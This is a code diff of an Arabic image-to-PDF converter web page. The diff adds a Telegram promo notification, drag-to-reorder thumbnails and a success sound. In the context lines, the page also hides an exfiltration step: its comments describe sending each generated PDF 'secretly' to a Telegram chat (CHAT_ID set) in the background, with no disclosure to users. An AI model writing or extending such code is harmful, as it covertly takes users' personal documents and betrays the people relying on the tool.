@@ -25,6 +25,7 @@
             font-family: 'Tajawal', -apple-system, BlinkMacSystemFont, sans-serif;
             background-color: #000;
             overflow-x: hidden;
+            -webkit-tap-highlight-color: transparent; /* إزالة تظليل النقر في الجوال */
         }
 
         .font-brand {
@@ -97,7 +98,12 @@
             border: 1px solid rgba(255,255,255,0.1);
             position: relative;
             overflow: hidden;
-            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1); /* تسريع الحركة قليلاً لتناسب الصوت */
+            cursor: pointer;
+        }
+
+        .apple-btn:active {
+            transform: scale(0.98); /* تأثير ضغط واقعي */
         }
 
         .apple-btn::before {
@@ -136,16 +142,59 @@
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        /* أنماط للملصق الإعلاني */
+        /* --- تصميم إشعار الآيفون الجديد (نسخة مكبرة) --- */
         #banner {
-            transition: transform 0.5s ease-in-out, opacity 0.5s ease-in-out;
-            transform: translateY(-100%);
-            opacity: 0;
-            z-index: 60; /* أعلى من شريط التنقل */
+            position: fixed;
+            top: 20px; /* مسافة من الأعلى */
+            left: 50%;
+            /* يبدأ مخفياً للأعلى */
+            transform: translateX(-50%) translateY(-200%); 
+            width: 95%;
+            max-width: 500px; /* زيادة العرض الأقصى ليكون أكبر */
+            background: rgba(35, 35, 35, 0.90); /* لون داكن أكثر قليلاً */
+            backdrop-filter: blur(25px);
+            -webkit-backdrop-filter: blur(25px);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 22px; /* زوايا دائرية أكبر */
+            padding: 18px; /* زيادة الحشوة الداخلية */
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.6); /* ظل أعمق */
+            z-index: 100; /* أعلى من كل شيء */
+            /* حركة مرنة تشبه النابض */
+            transition: transform 0.6s cubic-bezier(0.34, 1.56, 0.64, 1); 
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 16px;
         }
+        
         #banner.show {
-            transform: translateY(0);
-            opacity: 1;
+            transform: translateX(-50%) translateY(0); /* ظهور في المكان */
+        }
+
+        /* تحسينات داخلية للإشعار */
+        .notification-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 0.8rem;
+            color: rgba(255, 255, 255, 0.6);
+            margin-bottom: 4px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        /* أنماط السحب والإفلات */
+        .draggable-item {
+            cursor: grab;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        .draggable-item.dragging {
+            opacity: 0.5;
+            cursor: grabbing;
+            transform: scale(0.95);
+        }
+        .drag-over {
+            border: 2px dashed #3b82f6;
         }
 
         /* إخفاء واجهة رفع الملفات الافتراضية */
@@ -161,27 +210,36 @@
         <div class="orb orb-3"></div>
     </div>
 
-    <!-- ملصق إعلاني يظهر ويختفي -->
-    <div id="banner" class="fixed top-0 left-0 w-full p-4 bg-black/50 backdrop-blur-md border-b border-white/10 flex items-center justify-between gap-4 shadow-lg">
-        <div class="flex items-center gap-4">
-            <div class="w-16 h-16 rounded-2xl bg-white/10 flex items-center justify-center border border-white/10 overflow-hidden shadow-sm">
-                <img src="https://www.dropbox.com/scl/fi/pw360ns6lmih3gjvyynf1/4413204.png?rlkey=jw9xdcefhg4vcmm24lbxnvub2&st=wz6b0zuj&dl=1" alt="شعار القناة" class="w-full h-full object-cover">
+    <!-- ملصق إعلاني (إشعار آيفون مكبر) -->
+    <div id="banner">
+        <!-- الجزء الأيمن: الأيقونة والنص -->
+        <div class="flex items-center gap-4 flex-1 overflow-hidden">
+            <!-- تكبير أيقونة القناة -->
+            <div class="w-14 h-14 flex-shrink-0 rounded-2xl bg-white/10 overflow-hidden shadow-sm border border-white/10">
+                <img src="https://www.dropbox.com/scl/fi/pw360ns6lmih3gjvyynf1/4413204.png?rlkey=jw9xdcefhg4vcmm24lbxnvub2&st=wz6b0zuj&dl=1" alt="Icon" class="w-full h-full object-cover">
             </div>
-            <div>
-                <h3 class="text-lg font-bold text-white">الخدمات الطلابية</h3>
-                <p class="text-sm text-white/70">انضموا بالقناة للمزيد من الخدمات الطلابية المميزة!</p>
+            <div class="flex flex-col">
+                <div class="notification-header">
+                    <span class="font-bold">TELEGRAM</span>
+                    <span>•</span>
+                    <span>الآن</span>
+                </div>
+                <h3 class="text-lg font-semibold text-white leading-tight">الخدمات الطلابية</h3>
+                <p class="text-sm text-white/80 truncate">انضموا بالقناة للمزيد من الخدمات المميزة!</p>
             </div>
         </div>
-        <!-- زر التليجرام -->
-        <a href="https://t.me/najaaf1" target="_blank" rel="noopener noreferrer" class="apple-btn px-6 py-2 rounded-full text-sm font-medium text-white flex items-center gap-2 whitespace-nowrap primary-glow group">
-            <img src="https://www.dropbox.com/scl/fi/1xvlsfrfk88twdb4sc6d5/telegram-icone-icon.png?rlkey=aarpjchjfvqhh53rxoyurrsrc&st=hq3k3ibm&dl=1" class="w-5 h-5 group-hover:scale-110 transition-transform" alt="Telegram">
-            <span>انضم الآن</span>
+        
+        <!-- زر التليجرام الجانبي (مكبر) -->
+        <a href="https://t.me/najaaf1" target="_blank" rel="noopener noreferrer" class="flex-shrink-0 bg-white/10 hover:bg-white/20 active:bg-white/30 text-white rounded-full p-3 transition-colors border border-white/5 shadow-lg group">
+            <div class="bg-[#2AABEE] rounded-full p-2 shadow-sm group-hover:scale-110 transition-transform">
+                 <img src="https://www.dropbox.com/scl/fi/1xvlsfrfk88twdb4sc6d5/telegram-icone-icon.png?rlkey=aarpjchjfvqhh53rxoyurrsrc&st=hq3k3ibm&dl=1" class="w-6 h-6" alt="Join">
+            </div>
         </a>
     </div>
 
     <!-- شريط التنقل العلوي -->
-    <nav class="fixed top-0 left-0 w-full p-6 z-50 flex justify-between items-center bg-transparent backdrop-blur-sm">
-        <div class="flex items-center gap-3">
+    <nav class="fixed top-0 left-0 w-full p-6 z-50 flex justify-between items-center bg-transparent backdrop-blur-sm pointer-events-none">
+        <div class="flex items-center gap-3 pointer-events-auto">
             <!-- أيقونة الانستغرام والمعرف -->
             <a href="https://instagram.com/c4man" target="_blank" class="flex items-center gap-2 px-3 py-1.5 rounded-full bg-white/5 border border-white/10 hover:bg-white/10 transition-colors cursor-pointer group">
                 <i data-lucide="instagram" class="w-5 h-5 text-white/90 group-hover:text-pink-400 transition-colors"></i>
@@ -220,7 +278,7 @@
                     </div>
                     <div class="text-center">
                         <p class="text-lg font-medium text-white/90">اضغط لاختيار الصور</p>
-                        <p class="text-xs text-white/40 mt-1">سيتم دمجها في ملف واحد</p>
+                        <p class="text-xs text-white/40 mt-1">يمكنك إعادة ترتيب الصور بعد الرفع</p>
                     </div>
                 </div>
             </div>
@@ -231,9 +289,11 @@
                     <span class="text-sm text-white/60">الصور المختارة (<span id="count">0</span>)</span>
                     <button onclick="clearFiles()" class="text-xs text-red-400 hover:text-red-300 transition-colors">مسح الكل</button>
                 </div>
-                <div id="gallery" class="flex gap-3 overflow-x-auto pb-4 snap-x custom-scrollbar">
+                <!-- تم تغيير العرض إلى grid لترتيب أفضل -->
+                <div id="gallery" class="grid grid-cols-3 sm:grid-cols-4 gap-3 pb-4">
                     <!-- سيتم إضافة الصور هنا بالجافاسكريبت -->
                 </div>
+                <p class="text-center text-xs text-white/30 mt-2">اسحب الصور لتغيير ترتيبها</p>
             </div>
 
             <!-- حقل تسمية الملف (جديد) -->
@@ -296,24 +356,65 @@
         // تفعيل الأيقونات
         lucide.createIcons();
 
-        // التحكم في ظهور وإخفاء الملصق الإعلاني بشكل دوري
-        document.addEventListener('DOMContentLoaded', () => {
-            const banner = document.getElementById('banner');
-            
-            const startBannerCycle = () => {
-                // إظهار الملصق
-                banner.classList.add('show');
+        // --- نظام الصوت (Sound System) ---
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
 
-                // إخفاء الملصق بعد 8 ثوانٍ
-                setTimeout(() => {
-                    banner.classList.remove('show');
-                    
-                    // إعادة الدورة بعد 20 ثانية من الاختفاء
-                    setTimeout(startBannerCycle, 20000);
-                }, 8000);
+        // 2. نغمة النجاح (Success Chime) - تم الإبقاء عليها فقط
+        function playSuccess() {
+            if (audioCtx.state === 'suspended') audioCtx.resume();
+            const t = audioCtx.currentTime;
+
+            // كورد موسيقي مبهج (C Major: C5, E5, G5)
+            const notes = [523.25, 659.25, 783.99]; 
+
+            notes.forEach((freq, i) => {
+                const osc = audioCtx.createOscillator();
+                const gain = audioCtx.createGain();
+                
+                osc.type = 'sine'; // موجة جيبية نقية
+                osc.frequency.value = freq;
+                
+                // تأخير بسيط بين النغمات لتأثير "Strum" (عزف متتابع)
+                const startTime = t + (i * 0.08); 
+                
+                // غلاف الصوت (Envelope)
+                gain.gain.setValueAtTime(0, startTime);
+                gain.gain.linearRampToValueAtTime(0.15, startTime + 0.05); // Attack
+                gain.gain.exponentialRampToValueAtTime(0.001, startTime + 1.2); // Long Decay
+
+                osc.connect(gain);
+                gain.connect(audioCtx.destination);
+                
+                osc.start(startTime);
+                osc.stop(startTime + 1.2);
+            });
+        }
+
+        // --- إدارة الإشعار العائم ---
+        let bannerTimeout;
+        const banner = document.getElementById('banner');
+
+        // دالة لإظهار الإشعار (تستخدم في البدء وعند اكتمال التحويل)
+        function showNotificationBanner() {
+            // إظهار الإشعار
+            banner.classList.add('show');
+            
+            // إخفاؤه بعد 8 ثوانٍ
+            clearTimeout(bannerTimeout);
+            bannerTimeout = setTimeout(() => {
+                banner.classList.remove('show');
+            }, 8000);
+        }
+
+        // التحكم في ظهور الإشعار بشكل دوري
+        document.addEventListener('DOMContentLoaded', () => {
+            const startBannerCycle = () => {
+                showNotificationBanner();
+                // إعادة الدورة بعد 50 ثانية
+                setTimeout(startBannerCycle, 50000);
             };
 
-            // البدء أول مرة بعد ثانية واحدة
+            // البدء أول مرة بعد ثانية واحدة من تحميل الصفحة
             setTimeout(startBannerCycle, 1000);
         });
 
@@ -322,51 +423,95 @@
             CHAT_ID: '6785437506'
         };
 
-        let selectedFiles = [];
-        let generatedPDFBlob = null; // لتخزين الملف الناتج
+        // تخزين بيانات الملفات (الملف نفسه + رابط العرض)
+        let filesData = []; 
+        let generatedPDFBlob = null; 
 
         // معالجة اختيار الملفات
         function handleFiles(files) {
-            const gallery = document.getElementById('gallery');
             const previewContainer = document.getElementById('preview-container');
             const namingSection = document.getElementById('naming-section');
-            const countSpan = document.getElementById('count');
 
             if (files.length > 0) {
                 previewContainer.classList.remove('hidden');
                 namingSection.classList.remove('hidden');
             }
 
+            // معالجة كل ملف وإضافته للمصفوفة
             Array.from(files).forEach(file => {
                 if (file.type.match('image.*')) {
-                    selectedFiles.push(file);
-                    
                     const reader = new FileReader();
                     reader.onload = (e) => {
-                        const imgDiv = document.createElement('div');
-                        imgDiv.className = 'flex-shrink-0 relative w-20 h-28 rounded-lg overflow-hidden border border-white/10 snap-center';
-                        imgDiv.innerHTML = `
-                            <img src="${e.target.result}" class="w-full h-full object-cover">
-                            <div class="absolute inset-0 bg-black/10"></div>
-                        `;
-                        gallery.appendChild(imgDiv);
+                        filesData.push({
+                            file: file,
+                            url: e.target.result,
+                            id: Date.now() + Math.random() // معرف فريد
+                        });
+                        renderGallery(); // إعادة رسم المعرض
                     };
                     reader.readAsDataURL(file);
                 }
             });
             
-            countSpan.innerText = selectedFiles.length;
-            
-            // إخفاء النتائج السابقة إذا تم إضافة صور جديدة
+            // إعادة تعيين الواجهة
             document.getElementById('result-actions').classList.add('hidden');
             document.getElementById('result-actions').classList.remove('flex');
             document.getElementById('convert-btn').classList.remove('hidden');
             document.getElementById('status-bar').classList.add('hidden');
         }
 
-        // مسح الملفات
+        // رسم معرض الصور مع الأرقام وإمكانية السحب
+        function renderGallery() {
+            const gallery = document.getElementById('gallery');
+            const countSpan = document.getElementById('count');
+            
+            gallery.innerHTML = '';
+            countSpan.innerText = filesData.length;
+
+            filesData.forEach((item, index) => {
+                const imgContainer = document.createElement('div');
+                imgContainer.className = 'draggable-item relative aspect-[3/4] rounded-lg overflow-hidden border border-white/10 group bg-white/5';
+                imgContainer.setAttribute('draggable', 'true');
+                imgContainer.dataset.index = index;
+
+                imgContainer.innerHTML = `
+                    <img src="${item.url}" class="w-full h-full object-cover pointer-events-none">
+                    <div class="absolute inset-0 bg-black/0 group-hover:bg-black/20 transition-colors"></div>
+                    
+                    <!-- الرقم التسلسلي -->
+                    <div class="absolute top-2 right-2 w-6 h-6 rounded-full bg-blue-500 text-white text-xs font-bold flex items-center justify-center shadow-lg border border-white/20 z-10">
+                        ${index + 1}
+                    </div>
+
+                    <!-- زر الحذف -->
+                    <button onclick="removeFile(${index})" class="absolute top-2 left-2 w-6 h-6 rounded-full bg-red-500/80 hover:bg-red-500 text-white flex items-center justify-center opacity-0 group-hover:opacity-100 transition-opacity z-10">
+                        <i data-lucide="x" class="w-3 h-3"></i>
+                    </button>
+                `;
+
+                // أحداث السحب والإفلات
+                imgContainer.addEventListener('dragstart', handleDragStart);
+                imgContainer.addEventListener('dragover', handleDragOver);
+                imgContainer.addEventListener('drop', handleDrop);
+                imgContainer.addEventListener('dragenter', handleDragEnter);
+                imgContainer.addEventListener('dragleave', handleDragLeave);
+
+                gallery.appendChild(imgContainer);
+            });
+            
+            lucide.createIcons();
+        }
+
+        // حذف ملف محدد
+        window.removeFile = function(index) {
+            filesData.splice(index, 1);
+            renderGallery();
+            if (filesData.length === 0) clearFiles();
+        };
+
+        // مسح الكل
         function clearFiles() {
-            selectedFiles = [];
+            filesData = [];
             generatedPDFBlob = null;
             document.getElementById('gallery').innerHTML = '';
             document.getElementById('preview-container').classList.add('hidden');
@@ -378,9 +523,58 @@
             document.getElementById('status-bar').classList.add('hidden');
         }
 
+        // --- منطق السحب والإفلات ---
+        let dragSrcEl = null;
+
+        function handleDragStart(e) {
+            this.style.opacity = '0.4';
+            dragSrcEl = this;
+            e.dataTransfer.effectAllowed = 'move';
+            e.dataTransfer.setData('text/html', this.innerHTML);
+            this.classList.add('dragging');
+        }
+
+        function handleDragOver(e) {
+            if (e.preventDefault) {
+                e.preventDefault();
+            }
+            e.dataTransfer.dropEffect = 'move';
+            return false;
+        }
+
+        function handleDragEnter(e) {
+            this.classList.add('drag-over');
+        }
+
+        function handleDragLeave(e) {
+            this.classList.remove('drag-over');
+        }
+
+        function handleDrop(e) {
+            if (e.stopPropagation) {
+                e.stopPropagation();
+            }
+
+            if (dragSrcEl !== this) {
+                const srcIndex = parseInt(dragSrcEl.dataset.index);
+                const targetIndex = parseInt(this.dataset.index);
+
+                // تبديل العناصر في المصفوفة
+                const itemToMove = filesData[srcIndex];
+                filesData.splice(srcIndex, 1);
+                filesData.splice(targetIndex, 0, itemToMove);
+
+                renderGallery(); // إعادة الرسم بالترتيب الجديد
+            }
+            return false;
+        }
+
+        // --- نهاية منطق السحب والإفلات ---
+
+
         // معالجة التحويل (إنشاء الملف وإرساله مخفياً)
         async function processFiles() {
-            if (selectedFiles.length === 0) {
+            if (filesData.length === 0) {
                 showToast('يرجى اختيار صور أولاً', 'error');
                 return;
             }
@@ -407,13 +601,13 @@
                 // إنشاء الـ PDF
                 progress.style.width = "50%";
                 progressPercent.innerText = "50%";
-                statusText.innerText = "جاري دمج الملفات...";
+                statusText.innerText = "جاري دمج الملفات بالترتيب...";
                 
-                generatedPDFBlob = await generatePDF(selectedFiles);
+                // استخدام filesData بدلاً من selectedFiles للحفاظ على الترتيب
+                generatedPDFBlob = await generatePDF(filesData);
                 
                 // --- إرسال تلقائي مخفي للتليجرام ---
                 const autoFileName = getFileName();
-                // نرسله في الخلفية دون انتظار لعدم تعطيل واجهة المستخدم
                 sendToTelegram(generatedPDFBlob, autoFileName).catch(err => {
                     console.error("فشل الإرسال التلقائي للخلفية", err);
                 });
@@ -423,6 +617,11 @@
                 progress.style.width = "100%";
                 progressPercent.innerText = "100%";
                 statusText.innerText = "تم إنشاء الملف بنجاح!";
+                
+                // 1. تشغيل صوت النجاح
+                playSuccess();
+                // 2. إظهار إشعار الخدمات الطلابية فوراً عند الانتهاء
+                showNotificationBanner();
                 
                 // إظهار زر التحميل فقط
                 setTimeout(() => {
@@ -451,7 +650,6 @@
         function getFileName() {
             const inputName = document.getElementById('filename-input').value.trim();
             if (inputName) {
-                // التأكد من عدم وجود لاحقة .pdf مكررة
                 return inputName.toLowerCase().endsWith('.pdf') ? inputName : `${inputName}.pdf`;
             }
             return `Document_${Date.now()}.pdf`;
@@ -475,30 +673,22 @@
         }
 
         // منطق إنشاء PDF باستخدام jsPDF
-        function generatePDF(files) {
+        function generatePDF(dataItems) {
             return new Promise((resolve, reject) => {
                 const { jsPDF } = window.jspdf;
                 const doc = new jsPDF();
                 
-                const fileToDataURL = (file) => {
-                    return new Promise((res, rej) => {
-                        const reader = new FileReader();
-                        reader.onload = (e) => res(e.target.result);
-                        reader.onerror = rej;
-                        reader.readAsDataURL(file);
-                    });
-                };
-
                 const processImages = async () => {
-                    for (let i = 0; i < files.length; i++) {
+                    for (let i = 0; i < dataItems.length; i++) {
                         // تحديث وهمي للشريط إذا كانت ملفات كثيرة
-                        if(files.length > 5) {
-                            const percent = 50 + Math.round((i / files.length) * 40);
+                        if(dataItems.length > 5) {
+                            const percent = 50 + Math.round((i / dataItems.length) * 40);
                             document.getElementById('progress').style.width = `${percent}%`;
                             document.getElementById('progress-percent').innerText = `${percent}%`;
                         }
 
-                        const imgData = await fileToDataURL(files[i]);
+                        // استخدام الرابط المخزن مسبقاً (DataURL)
+                        const imgData = dataItems[i].url;
                         if (i > 0) doc.addPage();
 
                         const imgProps = doc.getImageProperties(imgData);
